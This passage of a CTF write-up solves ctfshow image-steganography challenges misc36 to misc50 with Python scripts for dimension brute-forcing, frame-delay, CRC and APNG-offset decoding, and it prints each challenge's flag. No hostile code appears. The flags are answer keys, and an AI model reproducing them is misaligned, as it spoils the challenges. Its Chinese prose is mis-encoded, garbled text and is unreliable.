class="string">&#x27;./out/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    img = c[:c.index(<span class="string">b&#x27;\x03\xe8\x03\x84&#x27;</span>)+<span class="number">2</span>]+struct.pack(<span class="string">&#x27;&gt;h&#x27;</span>,i)+c[c.index(<span class="string">b&#x27;\x03\xe8\x03\x84&#x27;</span>)+<span class="number">4</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2 id="misc36"><a href="#misc36" class="headerlink" title="misc36"></a>misc36</h2><blockquote><p>å‡ºé¢˜äººå¦ç™½ä»å®½ï¼Œæ­£ç¡®çš„å®½åº¦åœ¨920-950ä¹‹é—´</p></blockquote><p>gifè¿™ä¸ªç»™æˆ‘å‘äº†å¥½é•¿æ—¶é—´~ å…¶å®å’Œå‰é¢è¿˜æ˜¯ä¸€ä¸ªæ ·è·‘è„šæœ¬å¾—åˆ°flagï¼šctfshow{1ebf739f832906d60f57436b8179166f}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/66636158445.png"></p><p>ä¸è¯´äº†ç›´æ¥çœ‹è„šæœ¬å§~ å‘œå‘œå‘œ~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;misc36.gif&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">900</span>,<span class="number">950</span>):</span><br><span class="line">    f1 = <span class="built_in">open</span>(<span class="string">&#x27;./out/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.gif&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    img = c[:c.index(<span class="string">b&#x27;\x00\x00\x84\x03\xb6\x03&#x27;</span>)+<span class="number">2</span>]+struct.pack(<span class="string">&#x27;&gt;h&#x27;</span>,i)[::-<span class="number">1</span>]+c[c.index(<span class="string">b&#x27;\x00\x00\x84\x03\xb6\x03&#x27;</span>)+<span class="number">4</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><h2 id="misc37"><a href="#misc37" class="headerlink" title="misc37"></a>misc37</h2><blockquote><p>flagåœ¨å›¾ç‰‡é‡Œ</p></blockquote><p>é€å¸§ä¿å­˜ç¿»çœ‹å³å¯å¾—åˆ°flagï¼šctfshow{2056782cd57b13261dcbbe3d6eecda17}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_9.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_14.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_21.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_31.jpg"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/misc37_34.jpg"></p><h2 id="misc38"><a href="#misc38" class="headerlink" title="misc38"></a>misc38</h2><blockquote><p>flagåœ¨å›¾ç‰‡é‡Œ</p></blockquote><p>å¥‡æ€ªçš„çŸ¥è¯†å¢åŠ .jpg è§è¯†åˆ°äº†ä»€ä¹ˆå«apngï¼ˆæƒ³äº†è§£æ›´å¤šå°±è‡ªè¡Œç™¾åº¦~</p><p>è¿™é‡Œæˆ‘ç›´æ¥åˆ©ç”¨å…¶ <a href="https://pan.baidu.com/s/1w-KLN09gVs4VR6BC-DQNng"><strong>ä¸“é—¨çš„å·¥å…·</strong></a>ï¼ˆæå–ç ï¼š2v42ï¼‰æ‰“å¼€å¾—åˆ°flagï¼šctfshow{48b722b570c603ef58cc0b83bbf7680d}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/09403838521859529.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3838522964.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/36383767845612546.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1040203038624161.png"></p><h2 id="misc39"><a href="#misc39" class="headerlink" title="misc39"></a>misc39</h2><blockquote><p>flagå°±åƒæ°´ï¼Œå¿½å¿«å¿½æ…¢åœ°æµ</p></blockquote><p>gifå¸§æ•°é—´éš”éšå†™ï¼Œä½¿ç”¨å·¥å…· <a href="https://pan.baidu.com/s/1hqRHsX_zpl6TXuJLq4JIdg"><strong>ImageMagick</strong></a>ï¼ˆæå–ç ï¼št7hcï¼‰æå–å¸§æ•°<br>è¿™é‡Œå‹æƒ…æé†’åƒä¸‡åˆ«ç”¨Windowsä¸‹çš„å„ç§ç‰ˆæœ¬éƒ½bugæ— æ•°ï¼Œäº²æµ‹ï¼ï¼å› æ­¤æˆ‘å‘çš„ä¹Ÿæ˜¯Linuxä¸‹çš„~ ä¸ä¿¡ä½ å°±è‡ªå·±çˆ¬å»**<a href="https://imagemagick.org/script/download.php">å®˜ç½‘</a>**ä¸‹ä¸€ä¸ªè¯•è¯•ï¼ˆæˆ–è€…å»æ›´å¥½ç”¨çš„ä¸­æ–‡ç«™ï¼š<a href="http://www.imagemagick.com.cn/download.html%EF%BC%89">http://www.imagemagick.com.cn/download.htmlï¼‰</a></p><p>kaliä¸‹ç¼–è¯‘å®‰è£…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>kaliä¸‹æå–å¸§æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%T &quot; misc39.gif &gt; misc39.txt</span><br><span class="line"></span><br><span class="line">37 37 36 36 36 37 37 37 37 37 36 37 36 36 37 37 36 36 37 37 36 37 37 37 36 36 37 37 37 37 36 37 36 36 36 37 37 36 37 37 37 37 37 37 37 36 37 37 37 37 37 37 37 36 37 37 36 37 37 36 37 36 37 36 37 37 36 36 37 36 36 37 37 37 36 36 36 36 37 37 36 36 36 37 36 37 37 36 36 37 36 37 37 36 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 37 36 37 37 36 37 36 37 37 37 36 36 37 37 36 37 37 36 36 36 37 36 36 37 37 36 37 37 37 37 37 36 36 36 37 36 37 37 36 36 37 36 37 36 37 37 36 36 37 36 36 37 37 36 37 37 36 36 37 37 37 36 36 36 37 37 36 36 37 36 36 36 37 37 37 36 36 37 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 37 36 36 36 36 37 36 37 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 36 37 36 37 37 36 36 36 37 37 37 37 36 36 36 36 37 36 37 37 36 36 36 36 36 37 37 36 37 36 36 36 37 37 36 37 36 37 36 37 37 37 36 36 37 37 37 37 37 37 36 37 </span><br></pre></td></tr></table></figure><p>è½¬01å†ä¸ƒä½ä¸€ç»„è½¬å­—ç¬¦å³å¯å¾—åˆ°flagï¼šctfshow{52812ff995fb7be268d963a9ebca0459}</p><p><strong>é™„ä¸Šè„šæœ¬</strong>ï¼ˆç™½å«–V3geD4gå¸ˆå‚…è„šæœ¬.gifï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;37 37 36 36 36 37 37 37 37 37 36 37 36 36 37 37 36 36 37 37 36 37 37 37 36 36 37 37 37 37 36 37 36 36 36 37 37 36 37 37 37 37 37 37 37 36 37 37 37 37 37 37 37 36 37 37 36 37 37 36 37 36 37 36 37 37 36 36 37 36 36 37 37 37 36 36 36 36 37 37 36 36 36 37 36 37 37 36 36 37 36 37 37 36 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 37 36 37 37 36 37 36 37 37 37 36 36 37 37 36 37 37 36 36 36 37 36 36 37 37 36 37 37 37 37 37 36 36 36 37 36 37 37 36 36 37 36 37 36 37 37 36 36 37 36 36 37 37 36 37 37 36 36 37 37 37 36 36 36 37 37 36 36 37 36 36 36 37 37 37 36 36 37 36 37 37 36 37 37 36 36 37 37 36 36 37 37 37 37 36 36 36 36 37 36 37 37 37 36 36 37 37 37 36 36 37 36 37 37 37 36 36 36 37 36 37 37 36 36 36 37 37 37 37 36 36 36 36 37 36 37 37 36 36 36 36 36 37 37 36 37 36 36 36 37 37 36 37 36 37 36 37 37 37 36 36 37 37 37 37 37 37 36 37&#x27;</span></span><br><span class="line">s = s.replace(<span class="string">&#x27;37&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27;36&#x27;</span>,<span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># s = s[1:]</span></span><br><span class="line">print(s)</span><br><span class="line">print(<span class="built_in">len</span>(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i*<span class="number">7</span>:i*<span class="number">7</span>+<span class="number">7</span>],<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#11000111110100110011011100111101000110111111101111111011011010101100100111000011000101100101100110110011001110010111001011010111001101100010011011111000101100101011001001101100111000110010001110010110110011001111000010111001110010111000101100011110000101100000110100011010101110011111101</span></span><br><span class="line"><span class="comment">#287</span></span><br><span class="line"><span class="comment">#ctfshow&#123;52812ff995fb7be268d963a9ebca0459&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc40"><a href="#misc40" class="headerlink" title="misc40"></a>misc40</h2><blockquote><p>flagå°±åƒæ­Œï¼Œæœ‰é•¿æœ‰çŸ­ä»¿ä½›å²æœˆæ‚ æ‚ </p></blockquote><p>åŸç†åŒä¸Šï¼Œåªæ˜¯æ¢æˆapngçš„å¸§æ—¶é—´é—´éš”éšå†™ï¼ˆä¹Ÿå°±æ˜¯misc38çš„æ“ä½œå¯¹å…¶è¿›è¡Œåˆ†è§£ï¼‰ï¼Œæœ€åè·‘ä¸‹è„šæœ¬å¾—åˆ°flagï¼šctfshow{95ca0297dff0f6b1bdaca394a6fcb95b}</p><p><strong>é™„ä¸Šè„šæœ¬</strong>ï¼ˆV3geD4g TQLï¼ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>,<span class="number">69</span>):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;./misc40/apngframe&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">    c =f.read()</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(c.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">0</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>])),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="misc41"><a href="#misc41" class="headerlink" title="misc41"></a>misc41</h2><blockquote><p>ï¼ˆæœ¬é¢˜ä¸ºMiscå…¥é—¨å›¾ç‰‡ç¯‡å’Œæ„šäººèŠ‚æ¯”èµ›ç‰¹åˆ«è”åŠ¨é¢˜ï¼‰<br>H4ppy Apr1l F001â€™s D4yï¼<br> æ„šäººèŠ‚åˆ°äº†ï¼Œä¸€ç¾¤ç¬¨è›‹å¾€å—é£ï¼Œä¸€ä¼šå„¿æ’æˆSå­—ï¼Œä¸€ä¼šå„¿æ’æˆBå­—ã€‚</p></blockquote><p>æ ¹æ®æç¤ºæœç´¢ä¸‹f001å°±ç›´æ¥çœ‹åˆ°äº†flagï¼šctfshow{fcbd427caf4a52f1147ab44346cd1cdd}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/8418799745325141.png"></p><h2 id="misc42"><a href="#misc42" class="headerlink" title="misc42"></a>misc42</h2><blockquote><p>flagæœ‰å¤šé•¿ï¼Ÿ2cmâ€¦â€¦ä¸å¥½æ„æ€æ‰“é”™äº†ï¼Œ41ä½</p></blockquote><p>IDATå—é•¿åº¦éšå†™ï¼Œå€ŸåŠ©å·¥å…·tweakpngï¼ˆ010ä¹Ÿè¡Œï¼‰ï¼Œè·‘ä¸‹è„šæœ¬å¾—åˆ°flagï¼šctfshow{078cbd0f9c8d3f2158e70529f8913c65}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/48959566545612342.png"></p><p>è´´ä¸Šè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">123</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">99</span>,<span class="number">98</span>,<span class="number">100</span>,<span class="number">48</span>,<span class="number">102</span>,<span class="number">57</span>,<span class="number">99</span>,<span class="number">56</span>,<span class="number">100</span>,<span class="number">51</span>,<span class="number">102</span>,<span class="number">50</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">56</span>,<span class="number">101</span>,<span class="number">55</span>,<span class="number">48</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">57</span>,<span class="number">102</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">51</span>,<span class="number">99</span>,<span class="number">54</span>,<span class="number">53</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;078cbd0f9c8d3f2158e70529f8913c65&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc43"><a href="#misc43" class="headerlink" title="misc43"></a>misc43</h2><blockquote><p>é”™è¯¯ä¸­éšè—ç€é€šå¾€æ­£ç¡®ç­”æ¡ˆçš„é“è·¯</p></blockquote><p>crcéšå†™ï¼Œ010æ‰“å¼€å°†å„ä¸ªidatçš„crcæå–å‡ºæ¥å¾—åˆ°flagï¼šctfshow{6eb2589ffff5e390fe6b87504dbc0892}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/6643255684943.png"></p><h2 id="misc44"><a href="#misc44" class="headerlink" title="misc44"></a>misc44</h2><blockquote><p>é”™è¯¯ä¸­è¿˜éšè—ç€å‘</p></blockquote><p>åˆ©ç”¨ä¸€æ¬¾è‡ªåŠ¨åŒ–æ£€æµ‹ä¿®å¤PNGæŸåçš„å–è¯å·¥å…·PCRTè¿›è¡Œä¿®å¤crcæ ¡éªŒå‡ºé”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘æ˜¯kaliä¸‹æ•´çš„</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;sherlly&#x2F;PCRT.git</span><br><span class="line">cd PCRT</span><br><span class="line">python PCRT.py -y -v -i misc44.png &gt; 44.txt</span><br></pre></td></tr></table></figure><p>å†è·‘ä¸‹è„šæœ¬å¾—åˆ°flagï¼šctfshow{cc1af32bf96308fc1263231be783f69e}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;44.txt&#x27;</span>)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    c = f.readline()</span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;chunk crc&#x27;</span> <span class="keyword">in</span> c:</span><br><span class="line">            <span class="comment"># print(c)</span></span><br><span class="line">            res+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;Correct IDAT CRC&#x27;</span> <span class="keyword">in</span> c:</span><br><span class="line">            res+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">print(res)</span><br><span class="line">print(<span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)//<span class="number">8</span>):</span><br><span class="line">    a = res[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="built_in">chr</span>(<span class="built_in">int</span>(a,<span class="number">2</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#11111111111111110110001101110100011001100111001101101000011011110111011101111011011000110110001100110001011000010110011000110011001100100110001001100110001110010011011000110011001100000011100001100110011000110011000100110010001101100011001100110010001100110011000101100010011001010011011100111000001100110110011000110110001110010110010101111101</span></span><br><span class="line"><span class="comment">#344</span></span><br><span class="line"><span class="comment">#Ã¿Ã¿ctfshow&#123;cc1af32bf96308fc1263231be783f69e&#125;</span></span><br></pre></td></tr></table></figure><h2 id="misc45"><a href="#misc45" class="headerlink" title="misc45"></a>misc45</h2><blockquote><p>æœ‰æ—¶å€™ä¹Ÿéœ€è¦æ¢ä¸€æ¢æ€ç»´æ ¼å¼</p></blockquote><p>ä¸åšäº†ä¸åšäº†ï¼ˆæ‰‹åŠ¨æ»‘ç¨½</p><h2 id="misc46"><a href="#misc46" class="headerlink" title="misc46"></a>misc46</h2><blockquote><p>ä½ è§è¿‡æ‰¶ä¹©å—</p></blockquote><p>åˆ©ç”¨å·¥å…· ImageMagick å¾—åˆ°æ¯å¸§çš„åç§»é‡ï¼Œç„¶åå°†å®ƒä½œä¸ºåæ ‡æ¥ç”»å›¾,å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å³å¯å¾—åˆ°flagï¼šctfshow{05906b3be8742a13a93898186bc5802f}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210406145817589.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;46.txt&#x27;</span>)</span><br><span class="line">pp = []</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    c = f.readline()</span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">        s = <span class="built_in">eval</span>(c.split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>]+<span class="string">&#x27;,&#x27;</span>+c.split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">2</span>][:<span class="number">2</span>])</span><br><span class="line">        pp.append(s)</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="comment"># print(c)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">400</span>,<span class="number">70</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pp:</span><br><span class="line">    new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    img.paste(new,i)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="misc47"><a href="#misc47" class="headerlink" title="misc47"></a>misc47</h2><blockquote><p>æ²¡è§è¿‡æ‰¶ä¹©ï¼Œé‚£ä½ çŸ¥é“ç¬”ä»™å—</p></blockquote><p>åŸç†åŒä¸Šï¼Œåªæ˜¯è¿™é‡Œæ¢æˆäº†apngï¼Œè·‘ä¸‹è„šæœ¬å¾—åˆ°flagï¼šctfshow{6d51f85b45a0061754a2776a32cf26c4}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4647123456456474647.png"></p><p><strong>é™„ä¸Šè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;misc47.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = c[c.index(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;6663544C00000001&#x27;</span>)):]</span><br><span class="line">pp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1124</span>,<span class="number">2</span>):</span><br><span class="line">    start = c.index(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;6663544C0000&#x27;</span>)+struct.pack(<span class="string">&#x27;&gt;h&#x27;</span>,i))</span><br><span class="line">    <span class="comment"># start = c.index(bytes.fromhex(&#x27;6663544C000000&#x27;+hex(i)[2:]))</span></span><br><span class="line">    <span class="comment"># print(start)</span></span><br><span class="line">    fc = c[start:start+<span class="number">30</span>]</span><br><span class="line">    print(fc[<span class="number">18</span>:<span class="number">20</span>],fc[<span class="number">22</span>:<span class="number">24</span>])</span><br><span class="line">    print(struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>,fc[<span class="number">18</span>:<span class="number">20</span>])+struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>,fc[<span class="number">22</span>:<span class="number">24</span>]))</span><br><span class="line">    pp.append(struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>,fc[<span class="number">18</span>:<span class="number">20</span>])+struct.unpack(<span class="string">&#x27;&gt;h&#x27;</span>,fc[<span class="number">22</span>:<span class="number">24</span>]))</span><br><span class="line">    <span class="comment"># print(fc.index(b&#x27;\xb6&#x27;),fc.index(b&#x27;\x34&#x27;))</span></span><br><span class="line"><span class="comment"># print(c[:100])</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">400</span>,<span class="number">70</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pp:</span><br><span class="line">    new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">1</span>,<span class="number">1</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    img.paste(new,i)</span><br><span class="line">plt.imshow(img)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="misc48"><a href="#misc48" class="headerlink" title="misc48"></a>misc48</h2><blockquote><p>é™„ä»¶çš„ç¬¬ï¼ˆDiï¼‰ä¸ƒï¼ˆQiï¼‰é¢˜ï¼ˆTiï¼‰ä¸­æœ‰æç¤ºã€‚æœ¬é¢˜ç•¥è„‘æ´ï¼Œå¯è·³è¿‡</p></blockquote><p>ä¸åšäº†ä¸åšäº†ï¼ˆæ‰‹åŠ¨æ»‘ç¨½</p><h2 id="misc49"><a href="#misc49" class="headerlink" title="misc49"></a>misc49</h2><blockquote><p>å®ƒä»¬ä¸€æ¥å°±æ˜¯åå…­ç§ã€‚æœ¬é¢˜ç•¥è„‘æ´ï¼Œå¯è·³è¿‡</p></blockquote><p>ä¸åšäº†ä¸åšäº†ï¼ˆæ‰‹åŠ¨æ»‘ç¨½</p><h1 id="å›¾ç‰‡ç¯‡-é¢œè‰²é€šé“"><a href="#å›¾ç‰‡ç¯‡-é¢œè‰²é€šé“" class="headerlink" title="å›¾ç‰‡ç¯‡(é¢œè‰²é€šé“)"></a>å›¾ç‰‡ç¯‡(é¢œè‰²é€šé“)</h1><h2 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h2><blockquote><p>æœ‰æ—¶å€™è§†çº¿ä¹Ÿè¦æ”¾ä½ä¸€ç‚¹</p></blockquote><p>stegæ‰“å¼€åœ¨çº¢ç»¿è“ä¸‰ä¸ªé€šé“ä¸­æ‰¾åˆ°flagï¼šctfshow{84470883ee1eec2e886436461bf79111}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5555505214874996.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/516264210055156.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/51522674780005555.png"></p><hr><p>å¾…ç»­â€¦.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mar.DASCTF 2021</title>
      <link href="2021/03/28/2021Mar.DASCTF/"/>
      <url>2021/03/28/2021Mar.DASCTF/</url>
      
